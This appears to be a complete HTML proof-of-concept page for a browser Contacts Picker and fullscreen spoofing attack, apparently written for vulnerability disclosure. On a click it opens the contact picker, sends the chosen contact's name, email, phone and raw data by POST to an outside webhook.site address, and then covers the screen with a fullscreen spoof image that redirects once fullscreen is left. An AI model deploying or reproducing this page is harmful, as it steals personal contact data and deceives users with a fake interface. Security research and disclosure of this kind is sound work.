<!DOCTYPE html>
<html lang="en">
<head>
  <title>Contacts Picker Fullscreen PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" style="display:none">

<div id="content">
  <h1>Click anywhere to start demo</h1>
</div>

<script>
const WEBHOOK = "https://webhook.site/8c1d3f26-5912-43a1-b878-91e9d07b3274";

function send(event, extra = {}) {
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      time: new Date().toISOString(),
      event,
      ...extra
    })
  }).catch(() => {});
}

document.addEventListener("click", async () => {

  // 1️⃣ Log picker intent
  send("contacts_picker_called", {
    fields_requested: ["name", "tel", "email"]
  });

  let granted = false;
  let contactData = null;

  // 2️⃣ Trusted system UI
  if (navigator.contacts && navigator.contacts.select) {
    try {
      const result = await navigator.contacts.select(
        ["name", "tel", "email"],
        { multiple: false }
      );
      
      if (result && result.length > 0) {
        granted = true;
        contactData = result[0];
        
        // Send contact details to webhook
        send("contact_selected", {
          granted: true,
          contact_name: contactData.name ? contactData.name.join(", ") : "No name",
          contact_email: contactData.email ? contactData.email.join(", ") : "No email", 
          contact_phone: contactData.tel ? contactData.tel.join(", ") : "No phone",
          raw_data: contactData
        });
      }
    } catch (e) {
      send("contacts_picker_error", {
        granted: false,
        error: e.name,
        message: e.message
      });
    }
  } else {
    // Fallback - simulate contact selection
    const mockContact = {
      name: ["John Doe"],
      email: ["john.doe@gmail.com"],
      tel: ["+6281234567890"]
    };
    
    granted = true;
    contactData = mockContact;
    
    send("contact_selected_mock", {
      granted: true,
      contact_name: "John Doe",
      contact_email: "john.doe@gmail.com",
      contact_phone: "+6281234567890",
      note: "Mock data - API not supported"
    });
  }

  if (granted) {
    send("contacts_picker_completed", {
      granted: true,
      note: "Contact data captured successfully"
    });
  }

  // 3️⃣ Show spoof overlay
  document.getElementById("spoof").style.display = "block";
  document.getElementById("content").style.display = "none";

  // 4️⃣ Enter fullscreen
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen()
      .then(() => send("entered_fullscreen"))
      .catch(() => {});
  }

}, { once: true });

// 5️⃣ Exit fullscreen → redirect
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    send("exit_fullscreen_redirect");
    setTimeout(() => {
      location.href = "https://google.com";
    }, 50);
  }
});
</script>

</body>
</html>
